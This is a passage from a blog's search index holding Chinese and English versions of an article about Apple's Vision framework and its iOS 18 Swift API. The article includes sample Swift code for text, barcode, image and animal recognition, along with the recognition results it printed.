recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let barcodesCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // 標記顏色 Layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let textCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let barcodesRequest = VNDetectBarcodesRequest(completionHandler: barcodesCompletionHandler) barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 let textRequest = VNRecognizeTextRequest(completionHandler: textCompletionHandler) textRequest.recognitionLevel = .accurate textRequest.recognitionLanguages = [\"en-US\"] DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([barcodesRequest, textRequest]) } catch { print(\"Request failed: \\(error)\") } }}輸出結果：94128sORGANICPink Lady®Produce of UShiOS ≥ 18 Update Highlight:let handler = ImageRequestHandler(fileURL)// parameter pack syntax and we must wait for all requests to finish before we can use their results.// let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...)let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest)iOS ≥ 18 performAll( ) 方法前面的 perform(barcodesRequest, textRequest) 處理 Barcode 掃描跟文字掃描的方式需要等到兩個 Request 都完成才能繼續執行；iOS 18 開始提供新的 performAll() 方法，將回應方式改為串流，在收到其中一個 Reqeust 結果是就能做對應處理，例如掃描到 Barcode 就直接響應。if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { let handler = ImageRequestHandler(fileURL) let observation = handler.performAll([barcodesRequest, textRequest] as [any VisionRequest]) for try await result in observation { switch result { case .detectBarcodes(_, let barcodesObservation): if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } case .recognizeText(_, let textObservation): textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } default: print(\"Unrecongnized result: \\(result)\") } } }}Optimize with Swift Concurrency假設我們有一個圖片牆列表，每張圖片都需要自動裁切出物件主體；這時候可以善用 Swift Concurrency 增加載入效率。原始寫法func generateThumbnail(url: URL) async throws -&gt; UIImage { let request = GenerateAttentionBasedSaliencyImageRequest() let saliencyObservation = try await request.perform(on: url) return cropImage(url, to: saliencyObservation.salientObjects)} func generateAllThumbnails() async throws { for image in images { image.thumbnail = try await generateThumbnail(url: image.url) }}一次只執行一個，效率、效能緩慢。優化 (1) — TaskGroup Concurrencyfunc generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in for image in images { image.thumbnail = try await generateThumbnail(url: image.url) } }}將每個 Task 都加入 TaskGroup Concurrency 執行。 問題：圖片辨識、截圖操作非常消耗記憶體性能，如果無節制狂加並行任務，可能造成使用者卡頓、OOM 閃退問題。優化 (2) — TaskGroup Concurrency + 限制並行數量func generateAllThumbnails() async throws { try await withThrowingDiscardingTaskGroup { taskGroup in // 最多執行數量不得超過 5 let maxImageTasks = min(5, images.count) // 先填充 5 個 Task for index in 0..&lt;maxImageTasks { taskGroup.addTask { image[index].thumbnail = try await generateThumbnail(url: image[index].url) } } var nextIndex = maxImageTasks for try await _ in taskGroup { // taskGroup 裡 Task await 完成時... // 檢查 Index 是否到尾部 if nextIndex &lt; images.count { let image = images[nextIndex] // 繼續逐個填充 Task (將維持在最多 5 個) taskGroup.addTask { image.thumbnail = try await generateThumbnail(url: image.url) } nextIndex += 1 } } }}Update an existing Vision app Vision 將在具備神經引擎的設備上移除對部分請求的 CPU 和 GPU 支持。在這些設備上，神經引擎是性能最好的選擇。可以使用 supportedComputeDevices() API 進行檢查 移除所有 VN 前綴VNXXRequest , VNXXXObservation -&gt; Reqeust , Observation 使用 async/await 取代原本的 VNRequestCompletionHandler 直接使用 *Request.perform() 取代原本的 VNImageRequestHandler.perform([VN*Request])Wrap-up 為 Swift 語言特性新設計的 API 新的功能、方法都為 Swift Only, iOS ≥ 18 可用 新的圖片評分功能、身體＋手部動作追蹤Thanks!KKday 招募工商👉👉👉本次讀書會分享源於 KKday App Team 組內每週技術分享活動， 目前團隊也正在熱情招募 Senior iOS Engineer ，有興趣的朋友歡迎投遞履歷 。👈👈👈參考資料Discover Swift enhancements in the Vision frameworkThe Vision Framework API has been redesigned to leverage modern Swift features like concurrency, making it easier and faster to integrate a wide array of Vision algorithms into your app. We’ll tour the updated API and share sample code, along with best practices, to help you get the benefits of this framework with less coding effort. We’ll also demonstrate two new features: image aesthetics and holistic body pose.Chapters 0:00 — Introduction 1:07 — New Vision API 1:47 — Get started with Vision 8:59 — Optimize with Swift Concurrency 11:05 — Update an existing Vision app 13:46 — What’s new in Vision?Vision framework Apple Developer Documentation-有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 835 Total Views Last Statistics Date: 2025-08-15 | 598 Views on Medium." }, { "title": "iOS Vision Framework x WWDC 24: Discover Swift Enhancements in the Vision Framework Session", "url": "/posts/kkday-tech-blog/en/ios-vision-framework-x-wwdc-24-discover-swift-enhancements-in-the-vision-framework-session-755509180ca8/", "categories": "KKday Tech Blog", "tags": "ios-app-development, vision-framework, apple-intelligence, ai, machine-learning", "date": "2024-08-13 16:10:37 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS Vision Framework x WWDC 24: Discover Swift Enhancements in the Vision Framework ...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS Vision Framework x WWDC 24: Discover Swift Enhancements in the Vision Framework SessionA review of the Vision framework features &amp; hands-on with the new Swift API in iOS 18Photo by BoliviaInteligenteTopicThe relationship between Vision Pro and hot dogs is as unrelated as it gets.Vision FrameworkThe Vision framework is Apple’s integrated image recognition framework that leverages machine learning, allowing developers to easily and quickly implement common image recognition functionalities. Launched with iOS 11.0 (2017/iPhone 8), the framework has undergone continuous iterations and optimizations, enhancing its integration with Swift Concurrency to improve execution performance. Starting from iOS 18.0, it introduces a brand new Swift Vision framework API that maximizes the benefits of Swift Concurrency.Features of the Vision Framework Built-in methods for various image recognition and dynamic tracking (31 methods available as of iOS 18) On-device processing using the phone’s chip, ensuring fast and secure recognition without relying on cloud services Simple and user-friendly API Supported across all Apple platforms: iOS 11.0+, iPadOS 11.0+, Mac Catalyst 13.0+, macOS 10.13+, tvOS 11.0+, visionOS 1.0+ Released for several years (2017-present) with ongoing updates Integrated Swift language features to enhance computational performance I played around with this 6 years ago: An Introduction to Vision — Automatic Face Cropping for App Profile Pictures (Swift) This time, I revisited it alongside the WWDC 24 Discover Swift enhancements in the Vision framework Session to explore the new Swift features again.CoreMLApple also has another framework called CoreML, which is a machine learning framework based on on-device processing. It allows you to train your own models for recognizing objects and documents, which can then be integrated directly into your app. Interested developers can give it a try (e.g., Real-time Article Classification, real-time Spam Detection …).P.S.Vision vs. VisionKit: Vision is primarily used for image analysis tasks such as face recognition, barcode detection, and text recognition. It provides powerful APIs for processing and analyzing visual content in static images or videos. VisionKit is specifically designed for tasks related to document scanning. It provides a scanner view controller that can be used to scan documents and generate high-quality PDFs or images.The Vision framework cannot run on M1 models in the simulator; it can only be tested on physical devices. Running it in a simulator environment will throw a Could not create Espresso context error. I checked the official forum discussion but couldn’t find a solution. Since I don’t have a physical iOS 18 device for testing, all execution results in this article are based on older code (pre-iOS 18). If any errors arise with the new code, please feel free to leave a comment.WWDC 2024 — Discover Swift Enhancements in the Vision FrameworkDiscover Swift enhancements in the Vision framework This article shares notes from the WWDC 24 session on Discover Swift enhancements in the Vision framework along with some personal experimental insights.Introduction — Vision Framework FeaturesFace Recognition and Contour DetectionText Recognition in Image ContentAs of iOS 18, it supports 18 languages.// List of supported languagesif #available(iOS 18.0, *) { print(RecognizeTextRequest().supportedRecognitionLanguages.map { \"\\($0.languageCode!)-\\(($0.region?.identifier ?? $0.script?.identifier)!)\" })} else { print(try! VNRecognizeTextRequest().supportedRecognitionLanguages())}// The actual available recognition languages are as follows:// The output from iOS 18 shows the following results:// [\"en-US\", \"fr-FR\", \"it-IT\", \"de-DE\", \"es-ES\", \"pt-BR\", \"zh-Hans\", \"zh-Hant\", \"yue-Hans\", \"yue-Hant\", \"ko-KR\", \"ja-JP\", \"ru-RU\", \"uk-UA\", \"th-TH\", \"vi-VT\", \"ar-SA\", \"ars-SA\"]// I did not see the Swedish language mentioned at WWDC; it's unclear if it hasn't been released yet or if it's related to device region and language settings.Dynamic Motion Capture Enables dynamic capture of people and objects Gesture recognition allows for air signature functionalityWhat’s New in Vision? (iOS 18) — Image Scoring Feature (Quality, Memorability) Can calculate a score for input images, making it easier to filter out high-quality photos The scoring method includes multiple dimensions, not just image quality, but also lighting, angle, subject matter, and whether it evokes a memorable point … etc.During WWDC, the above three images were used for explanation (under the same quality): High-scoring image: good composition, lighting, and memorable points Low-scoring image: lacks a subject, appears to be a casual or accidental shot Utility image: technically well-taken but lacks memorable points, like stock images.iOS ≥ 18 New API: CalculateImageAestheticsScoresRequestlet request = CalculateImageAestheticsScoresRequest()let result = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!)// Photo scoreprint(result.overallScore)// Whether it is classified as a utility imageprint(result.isUtility)What’s New in Vision? (iOS 18) — Simultaneous Detection of Body and Gesture PosesPreviously, body poses and hand poses could only be detected individually. This update allows developers to detect body poses and hand poses simultaneously, combining them into a single request and result, facilitating the development of more application functionalities.iOS ≥ 18 New API: DetectHumanBodyPoseRequestvar request = DetectHumanBodyPoseRequest()// Also detect hand posesrequest.detectsHands = trueguard let bodyPose = try await request.perform(on: image).first else { return }// Body Pose Jointslet bodyJoints = bodyPose.allJoints()// Left Hand Pose Jointslet leftHandJoints = bodyPose.leftHand.allJoints()// Right Hand Pose Jointslet rightHandJoints = bodyPose.rightHand.allJoints()New Vision APIIn this update, Apple has provided new Swift Vision API wrappers for developers. In addition to supporting the original functionalities, the focus is on enhancing Swift 6 / Swift Concurrency features, offering better performance and a more Swift-like API operation style.Get Started with VisionThe speaker reintroduced the basic usage of the Vision framework, which Apple has packaged into 31 types (as of iOS 18) of common image recognition requests and their corresponding observation objects. Request: DetectFaceRectanglesRequest for face area recognitionResult: FaceObservationThe previous article “An Introduction to Vision — Automatic Face Cropping for App Profile Pictures (Swift)” used this pair of requests. Request: RecognizeTextRequest for text recognitionResult: RecognizedTextObservation Request: GenerateObjectnessBasedSaliencyImageRequest for subject object recognitionResult: SaliencyImageObservationAll 31 Types of Requests:VisionRequest.Here’s the translated text in naturalistic English while preserving the original markdown image sources: Request Purpose Observation Description CalculateImageAestheticsScoresRequestCalculate the aesthetics score of an image. AestheticsObservationReturns the aesthetics score of the image, considering factors like composition and color. ClassifyImageRequestClassify the content of an image. ClassificationObservationReturns classification labels and confidence levels for objects or scenes in the image. CoreMLRequestAnalyze the image using a Core ML model. CoreMLFeatureValueObservationGenerates observations based on the output of the Core ML model. DetectAnimalBodyPoseRequestDetect the pose of animals in the image. RecognizedPointsObservationReturns the skeletal points of the animal and their locations. DetectBarcodesRequestDetect barcodes in the image. BarcodeObservationReturns barcode data and types (e.g., QR code). DetectContoursRequestDetect contours in the image. ContoursObservationReturns the detected contour lines in the image. DetectDocumentSegmentationRequestDetect and segment documents in the image. RectangleObservationReturns the rectangular boundary positions of the document. DetectFaceCaptureQualityRequestEvaluate the quality of face capture. FaceObservationReturns a quality assessment score for the face image. DetectFaceLandmarksRequestDetect facial landmarks. FaceObservationReturns detailed positions of facial landmarks (e.g., eyes, nose, etc.). DetectFaceRectanglesRequestDetect faces in the image. FaceObservationReturns the boundary box positions of the faces. DetectHorizonRequestDetect the horizon in the image. HorizonObservationReturns the angle and position of the horizon. DetectHumanBodyPose3DRequestDetect 3D human body poses in the image. RecognizedPointsObservationReturns 3D skeletal points of the human body and their spatial coordinates. DetectHumanBodyPoseRequestDetect human body poses in the image. RecognizedPointsObservationReturns skeletal points of the human body and their coordinates. DetectHumanHandPoseRequestDetect hand poses in the image. RecognizedPointsObservationReturns skeletal points of the hand and their locations. DetectHumanRectanglesRequestDetect humans in the image. HumanObservationReturns the boundary box positions of the human figures. DetectRectanglesRequestDetect rectangles in the image. RectangleObservationReturns the coordinates of the four vertices of the rectangle. DetectTextRectanglesRequestDetect text areas in the image. TextObservationReturns the positions and boundary boxes of the text areas. DetectTrajectoriesRequestDetect and analyze the motion trajectories of objects. TrajectoryObservationReturns the motion trajectory points and their time series. GenerateAttentionBasedSaliencyImageRequestGenerate an attention-based saliency image. SaliencyImageObservationReturns a saliency map highlighting the most attractive areas in the image. GenerateForegroundInstanceMaskRequestGenerate a foreground instance mask image. InstanceMaskObservationReturns the mask of the foreground object. GenerateImageFeaturePrintRequestGenerate an image feature fingerprint for comparison. FeaturePrintObservationReturns the feature fingerprint data of the image for similarity comparison. GenerateObjectnessBasedSaliencyImageRequestGenerate an objectness-based saliency image. SaliencyImageObservationReturns a saliency map highlighting the salient areas based on objectness. GeneratePersonInstanceMaskRequestGenerate a person instance mask image. InstanceMaskObservationReturns the mask of the person instance. GeneratePersonSegmentationRequestGenerate a person segmentation image. SegmentationObservationReturns a binary image of the person segmentation. RecognizeAnimalsRequestDetect and identify animals in the image. RecognizedObjectObservationReturns the type of animal and its confidence level. RecognizeTextRequestDetect and recognize text in the image. RecognizedTextObservationReturns the detected text content and its area location. TrackHomographicImageRegistrationRequestTrack the homographic image registration. ImageAlignmentObservationReturns the homographic transformation matrix between images for alignment. TrackObjectRequestTrack objects in the image. DetectedObjectObservationReturns the position and speed information of the object in the image. TrackOpticalFlowRequestTrack optical flow in the image. OpticalFlowObservationReturns the optical flow vector field to describe pixel movement. TrackRectangleRequestTrack rectangles in the image. RectangleObservationReturns the position, size, and rotation angle of the rectangle in the image. TrackTranslationalImageRegistrationRequestTrack the translational image registration. ImageAlignmentObservationReturns the translational transformation matrix between images for alignment. Prefixing with VN indicates the old API syntax (for versions prior to iOS 18).The speaker mentioned several commonly used requests, as follows.ClassifyImageRequestRecognize the input image and obtain classification labels and confidence levels.[Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering via Busan → Hakata Cruiseif #available(iOS 18.0, *) { // New API using Swift features let request = ClassifyImageRequest() Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!) observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old syntax let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNClassificationObservation] else { return } observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } let request = VNClassifyImageRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*3_jdrLurFuUfNdW4BJaRww.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results: • outdoor: 0.75392926 • sky: 0.75392926 • blue_sky: 0.7519531 • machine: 0.6958008 • cloudy: 0.26538086 • structure: 0.15728651 • sign: 0.14224191 • fence: 0.118652344 • banner: 0.0793457 • material: 0.075975396 • plant: 0.054406323 • foliage: 0.05029297 • light: 0.048126098 • lamppost: 0.048095703 • billboards: 0.040039062 • art: 0.03977703 • branch: 0.03930664 • decoration: 0.036868922 • flag: 0.036865234.... and moreRecognizeTextRequestRecognize the text content in the image (a.k.a. image-to-text).[Travelogue] 2023 Tokyo 5-Day Free Tripif #available(iOS 18.0, *) { // New API using Swift features var request = RecognizeTextRequest() request.recognitionLevel = .accurate request.recognitionLanguages = [.init(identifier: \"ja-JP\"), .init(identifier: \"en-US\")] // Specify language code, e.g., Traditional Chinese Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!) observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old syntax let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let request = VNRecognizeTextRequest(completionHandler: completionHandler) request.recognitionLevel = .accurate request.recognitionLanguages = [\"ja-JP\", \"en-US\"] // Specify language code, e.g., Traditional Chinese DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:LE LABO 青山店TEL:03-6419-7167＊Thank you for your purchase*No: 21347Date: 2023/06/10 14:14:57Person in charge:1690370Register: 008A 1Product NameTax-inclusive Price Quantity Total PriceKaiak 10 EDP FB 15MLJ1P7010000S16,80016,800Another 13 EDP FB 15MLJ1PJ010000S10,70010,700Lip Balm 15MLJOWC010000S2,0001Total Amount(Tax included)CARD2,0003 items purchased29,500029,50029,500DetectBarcodesRequestDetect barcodes and QR code data in the image.Recommended by locals in Thailand: Goose Brand Cooling Balmlet filePath = Bundle.main.path(forResource: \"IMG_6777\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features let request = DetectBarcodesRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old syntax let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } observations.forEach { observation in print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:Payload: 8859126000911Symbology: VNBarcodeSymbologyEAN13Payload: https://lin.ee/hGynbVMSymbology: VNBarcodeSymbologyQRPayload: http://www.hongthaipanich.com/Symbology: VNBarcodeSymbologyQRPayload: https://www.facebook.com/qr?id=100063856061714Symbology: VNBarcodeSymbologyQRRecognizeAnimalsRequestIdentify animals in the image along with their confidence levels.meme Sourcelet filePath = Bundle.main.path(forResource: \"IMG_5026\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features let request = RecognizeAnimalsRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } catch { print(\"Request failed: \\(error)\") } }} else { // Old method let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedObjectObservation] else { return } observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } let request = VNRecognizeAnimalsRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}Analysis Results:Detected animal: Cat with confidence: 0.77245045Others: Detect humans in images: DetectHumanRectanglesRequest Detect poses of humans and animals (both 3D and 2D): DetectAnimalBodyPoseRequest, DetectHumanBodyPose3DRequest, DetectHumanBodyPoseRequest, DetectHumanHandPoseRequest Detect and track the motion trajectories of objects (in videos and animations): DetectTrajectoriesRequest, TrackObjectRequest, TrackRectangleRequestiOS ≥ 18 Update Highlights:VN*Request -&gt; *Request (e.g. VNDetectBarcodesRequest -&gt; DetectBarcodesRequest)VN*Observation -&gt; *Observation (e.g. VNRecognizedObjectObservation -&gt; RecognizedObjectObservation)VNRequestCompletionHandler -&gt; async/awaitVNImageRequestHandler.perform([VN*Request]) -&gt; *Request.perform()WWDC ExampleThe official WWDC video uses a supermarket product scanner as an example.Most products have barcodes that can be scanned.We can obtain the location of the barcode from observation.boundingBox, but unlike the common UIView coordinate system, the BoundingBox relative position starts from the bottom left corner, with values ranging from 0 to 1.let filePath = Bundle.main.path(forResource: \"IMG_6785\", ofType: \"png\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features var request = DetectBarcodesRequest() request.symbologies = [.ean13] // Specify to scan only EAN13 Barcode for better performance Task { do { let observations = try await request.perform(on: fileURL) if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Color layer for marking let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Not tested; actual calculations may require adjustments for ContentMode = AspectFit: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old method let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // Color layer for marking let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) request.symbologies = [.ean13] // Specify to scan only EAN13 Barcode for better performance DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}iOS ≥ 18 Update Highlights:// iOS &gt;=18 new coordinate conversion API toImageCoordinatesobservation.boundingBox.toImageCoordinates(CGSize, origin: .upperLeft)// https://developer.apple.com/documentation/vision/normalizedpoint/toimagecoordinates(from:imagesize:origin:)Helper:// Generated by ChatGPT 4o// Since the photo in the ImageView is set with ContentMode = AspectFit// We need to calculate the vertical displacement caused by the fitfunc convertBoundingBox(_ boundingBox: CGRect, to view: UIImageView) -&gt; CGRect { guard let image = view.image else { return .zero } let imageSize = image.size let viewSize = view.bounds.size let imageRatio = imageSize.width / imageSize.height let viewRatio = viewSize.width / viewSize.height var scaleFactor: CGFloat var offsetX: CGFloat = 0 var offsetY: CGFloat = 0 if imageRatio &gt; viewRatio { // Image fits in width scaleFactor = viewSize.width / imageSize.width offsetY = (viewSize.height - imageSize.height * scaleFactor) / 2 } else { // Image fits in height scaleFactor = viewSize.height / imageSize.height offsetX = (viewSize.width - imageSize.width * scaleFactor) / 2 } let x = boundingBox.minX * imageSize.width * scaleFactor + offsetX let y = (1 - boundingBox.maxY) * imageSize.height * scaleFactor + offsetY let width = boundingBox.width * imageSize.width * scaleFactor let height = boundingBox.height * imageSize.height * scaleFactor return CGRect(x: x, y: y, width: width, height: height)}Output ResultsBoundingBox: (0.5295758928571429, 0.21408638121589782, 0.0943080357142857, 0.21254415360708087)Payload: 4710018183805Symbology: VNBarcodeSymbologyEAN13Some products do not have barcodes, such as bulk fruits that only have product labels.Therefore, our scanner also needs to support scanning plain text labels.let filePath = Bundle.main.path(forResource: \"apple\", ofType: \"jpg\")! // Local test imagelet fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // New API using Swift features var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // Specify to scan only EAN13 Barcode for better performance var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { do { let handler = ImageRequestHandler(fileURL) // Parameter pack syntax; we must wait for all requests to finish before using their results. // let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...) let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest) if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // Color layer for marking let colorLayer = CALayer() // iOS &gt;=18 new coordinate conversion API toImageCoordinates // Not tested; actual calculations may require adjustments for ContentMode = AspectFit: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // Old method let barcodesCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // Color layer for marking let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let textCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let barcodesRequest = VNDetectBarcodesRequest(completionHandler: barcodesCompletionHandler) barcodesRequest.symbologies = [.ean13] // Specify to scan only EAN13 Barcode for better performance let textRequest = VNRecognizeTextRequest(completionHandler: textCompletionHandler) textRequest.recognitionLevel = .accurate textRequest.recognitionLanguages = [\"en-US\"] DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([barcodesRequest, textRequest]) } catch { print(\"Request failed: \\(error)\") } }}Output Results:94128sORGANICPink Lady®Produce of UShiOS ≥ 18 Update Highlights:let handler = ImageRequestHandler(fileURL)// Parameter pack syntax; we must wait for all requests to finish before using their results.// let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...)let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest)iOS ≥ 18 performAll() MethodThe previous perform(barcodesRequest, textRequest) method requires waiting for both requests to complete before proceeding; starting with iOS 18, a new performAll() method is provided, allowing for streaming responses. You can handle results as soon as one of the requests is completed, such as responding immediately upon scanning a barcode.if #available(iOS 18.0, *) { // New API using Swift features var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // Specify to scan only EAN13 Barcode for better performance var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { let handler = ImageRequestHandler(fileURL) let observation = handler.performAll([barcodesRequest, textRequest] as [any VisionRequest]) for try await result in observation { switch result { case 